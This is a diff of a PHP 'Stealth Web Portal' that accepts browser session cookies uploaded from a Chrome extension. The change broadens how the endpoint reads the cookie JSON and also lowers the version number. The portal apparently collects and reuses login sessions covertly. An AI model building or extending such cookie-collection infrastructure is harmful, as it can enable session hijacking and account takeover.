@@ -1,6 +1,6 @@
 <?php
 /**
- * Stealth Web Portal Interface - Version 23.0.0
+ * Stealth Web Portal Interface - Version 22.0.0
  * Clean, modern, responsive UI without proxy footprints.
  * Compatible with all shared cPanel/Apache PHP 7.x - 8.x environments.
  * Includes user authentication and session upload from Chrome extension.
@@ -113,8 +113,24 @@ if ($action === 'login' || $action === 'register' || $action === 'upload_session
             exit;
         }
         
-        // Get cookies JSON from POST data
-        $cookiesJson = isset($_POST['cookies']) ? $_POST['cookies'] : '';
+        // Get cookies JSON from POST data - support both raw JSON and form-encoded
+        $cookiesJson = '';
+        if (isset($_POST['cookies'])) {
+            $cookiesJson = $_POST['cookies'];
+        } elseif (isset($_POST['data'])) {
+            $cookiesJson = $_POST['data'];
+        } else {
+            // Try to read from php://input for raw JSON
+            $rawInput = file_get_contents('php://input');
+            if (!empty($rawInput)) {
+                $parsed = json_decode($rawInput, true);
+                if (isset($parsed['cookies'])) {
+                    $cookiesJson = json_encode($parsed['cookies']);
+                } elseif (is_array($parsed)) {
+                    $cookiesJson = $rawInput;
+                }
+            }
+        }
         if (empty($cookiesJson)) {
             echo json_encode(['success' => false, 'message' => 'داده‌های کوکی خالی است']);
             exit;
